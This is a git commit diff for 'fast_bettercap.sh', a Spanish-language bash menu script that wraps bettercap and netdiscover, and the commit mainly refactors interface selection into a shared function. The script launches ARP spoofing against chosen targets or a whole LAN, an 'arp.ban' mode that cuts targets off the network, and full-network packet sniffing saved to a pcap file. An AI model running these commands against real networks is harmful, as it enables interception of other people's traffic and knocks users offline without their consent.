fb006b45d32f881f0e43ba148ee138eb45629858
J0hn-W1ck <hablemosdehacking@gmail.com>
2018-09-23 20:36:55 -0300

    Update fast_bettercap.sh

--- fast_bettercap.sh
+++ fast_bettercap.sh
@@ -62,8 +62,7 @@ fi
 MENU_PRINCIPAL
 }
 
-
-HOSTUPBETTERCAP() {
+SET_TARGET() {
 	sleep 2 &
 PID=$!
 i=1
@@ -75,40 +74,24 @@ while [ -d /proc/$PID ]
 			printf "\b${sp:i++%${#sp}:1}"
 done
 	echo; echo -e "\e[0;33m ";  iwconfig 2>&1 | grep 802.11 | awk '{print "* "$1," <-------->  "$4,$5,$6,$7}'
-	echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar :> \e[0m"; tput sgr0
+	echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar:> \e[0m"; tput sgr0
 	read INTERFACE
 	INTERFACES=`airmon-ng|grep ''"$INTERFACE"|cut -f2`
 	while [ -z "$INTERFACE" -o "$INTERFACES" != "$INTERFACE" ]; do
 		echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o la interfaz no esta disponible..\e[0m";
-		echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar :> \e[0m"; tput sgr0
+		echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar:> \e[0m"; tput sgr0
 		read INTERFACE
 		INTERFACES=`airmon-ng|grep ''"$INTERFACE"|cut -f2`
 	done
-	
+}
+
+HOSTUPBETTERCAP() {
+	SET_TARGET
 	gnome-terminal -t Bettercap Network Devices --geometry=170x35 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; ticker on " && clear; MENU_PRINCIPAL;
 }
  
 HOSTUPNETDISCOVER() {
-		sleep 2 &
-PID=$!
-i=1
-sp="/-\|"
-echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Buscando interfaces disponibles.. \e[0m" $(echo -e "\e[0;31m  "  )
-while [ -d /proc/$PID ]
-		do
-			sleep 0.1
-			printf "\b${sp:i++%${#sp}:1}"
-done
-	echo; echo -e "\e[0;33m ";  iwconfig 2>&1 | grep 802.11 | awk '{print "* "$1," <-------->  "$4,$5,$6,$7}'
-	echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar :> \e[0m"; tput sgr0
-	read INTERFACE
-	INTERFACES=`airmon-ng|grep ''"$INTERFACE"|cut -f2`
-	while [ -z "$INTERFACE" -o "$INTERFACES" != "$INTERFACE" ]; do
-		echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o la interfaz no esta disponible..\e[0m";
-		echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar :> \e[0m"; tput sgr0
-		read INTERFACE
-		INTERFACES=`airmon-ng|grep ''"$INTERFACE"|cut -f2`
-	done
+	SET_TARGET;
 	echo -e "\e[0;32m " | gnome-terminal -t Netdiscover Network Devices --geometry=100x30 --zoom=1 -- netdiscover -i $INTERFACE && clear; MENU_PRINCIPAL;
 }
 
@@ -140,88 +123,64 @@ done
 
 
 BAN_TARGET() {
+	SET_TARGET;
 	sleep 0.5 ;echo;
-	echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Puede banear mas de un target separados por (,) Ejemplo: 192.X.X.X,192.X.X.X\e[0m"
-	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Target/s :> \e[0m"; tput sgr0
-	read INTERFACE
-		while [[ -z "$INTERFACE" ]]; do
-			   echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo \"targets/s\" esta vacio.\e[0m";echo;
-			   echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Target/s :> \e[0m"; tput sgr0
+	echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Puede banear mas de un objetivo. Ejemplo: 192.X.X.X,192.X.X.X\e[0m"
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Target_Ban:> \e[0m"; tput sgr0
+	read TARGETS
+		while [[ -z "$TARGETS" ]]; do
+			   echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo \"target_ban\" esta vacio.\e[0m";echo;
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Target_Ban:> \e[0m"; tput sgr0
 			   read TARGETS
 		done
-	gnome-terminal -t sniff_all --geometry=190x40 --zoom=0.7 -- bettercap -eval "set arp.spoof.targets $TARGETS; arp.spoof on; arp.ban on; net.probe on" && MENU_PRINCIPAL
-
+	gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $TARGETS; arp.spoof on; set arp.ban on; net.probe on" && clear; MENU_PRINCIPAL
 }
 
 
 SNIFFALL() { 				
-sleep 2 &
-PID=$!
-i=1
-sp="/-\|"
-echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Buscando interfaces disponibles.. \e[0m" $(echo -e "\e[0;31m  "  )
-while [ -d /proc/$PID ]
-		do
-			sleep 0.1
-			printf "\b${sp:i++%${#sp}:1}"
+SET_TARGET														
+while true; do
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
+	read SINO
+	while [[ -z "$SINO" ]]; do
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio.\e[0m";
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
+		read SINO
 done
-						    echo; echo -e "\e[0;33m ";  iwconfig 2>&1 | grep 802.11 | awk '{print "* "$1," <-------->  "$4,$5,$6,$7}'
-							echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar :> \e[0m"; tput sgr0
-							read INTERFACE
-							INTERFACES=`airmon-ng|grep ''"$INTERFACE"|cut -f2`
-								while [ -z "$INTERFACE" -o "$INTERFACES" != "$INTERFACE" ]; do
-									echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o la interfaz no esta disponible..\e[0m";
-									echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar :> \e[0m"; tput sgr0
-									read INTERFACE
-									INTERFACES=`airmon-ng|grep ''"$INTERFACE"|cut -f2`
-								done
-								
-								
-					while true; do
-							echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
-							read SINO
-									while [[ -z "$SINO" ]]; do
-											echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio.\e[0m";
-											echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
-											read SINO
-									done
 
-						 case $SINO in
-								[s]* ) echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
-										read SALIDA_FAST_BETTERCAP
-											while [[ -z "$SALIDA_FAST_BETTERCAP"  ]] || [[ ! -d "$SALIDA_FAST_BETTERCAP" ]]; do 
-												echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o el directorio no existe..\e[0m" 
-												echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
-												read SALIDA_FAST_BETTERCAP
-											done
-									gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; set net.sniff.verbose false; net.sniff on"&& clear; MENU_PRINCIPAL;
-										
-										sleep 1 ;echo;echo -e "\e[0;30m\e[42m[[[ Fast_Bettercap V0.2 ]]]\e[0m";echo;
-										echo -e "\e[0;34m[[[\e[1;32m0\e[0;34m]]]\e[0;37m Menu principal\e[0m"
-										echo -e "\e[0;34m[[[\e[1;32m99\e[0;34m]]]\e[0;37m Cerrar script\e[0m"; sleep 0.5
-								while true;do
-										echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Elija una opcion :> \e[0m"; tput sgr0
-										read OPCION
-										case $OPCION in
-											0)  MENU_PRINCIPAL
-											;;
-											99) exit
-											;;
-											*) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Opcion incorrecta..\e[0m"
-											;;
-										esac 
-								 done 
-									;;
-								[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on "&& clear; MENU_PRINCIPAL;
-									;;	
-									* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
-									;;
-						 esac
-
+	 case $SINO in
+			[s]* ) echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
+	 				read SALIDA_FAST_BETTERCAP
+					while [[ -z "$SALIDA_FAST_BETTERCAP"  ]] || [[ ! -d "$SALIDA_FAST_BETTERCAP" ]]; do 
+							echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o el directorio no existe..\e[0m" 
+							echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
+							read SALIDA_FAST_BETTERCAP
 					done
-						}
-
-
+							gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; set net.sniff.verbose false; net.sniff on"&& clear; MENU_PRINCIPAL;
+							
+							sleep 1 ;echo;echo -e "\e[0;30m\e[42m[[[ Fast_Bettercap V0.2 ]]]\e[0m";echo;
+							echo -e "\e[0;34m[[[\e[1;32m0\e[0;34m]]]\e[0;37m Menu principal\e[0m"
+							echo -e "\e[0;34m[[[\e[1;32m99\e[0;34m]]]\e[0;37m Cerrar script\e[0m"; sleep 0.5
+while true;do
+	echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Elija una opcion :> \e[0m"; tput sgr0
+	read OPCION
+		case $OPCION in
+			0)  MENU_PRINCIPAL
+			;;
+			99) exit
+			;;
+			*) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Opcion incorrecta..\e[0m"
+			;;
+		esac 
+done 
+			;;
+		[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on "&& clear; MENU_PRINCIPAL;
+			;;	
+			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
+			;;
+	esac
+done
+}
 
 MENU_PRINCIPAL() { echo;BANNER;
 echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Sniff all (sniffear toda la red ) \e[0m"
